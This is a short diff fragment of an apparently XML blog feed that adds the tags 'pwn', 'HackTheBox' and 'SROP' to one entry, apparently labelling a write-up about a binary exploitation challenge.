+        <tag>pwn</tag>
+        <tag>HackTheBox</tag>
+        <tag>SROP</tag>
       </tags>
   </entry>
   <entry>
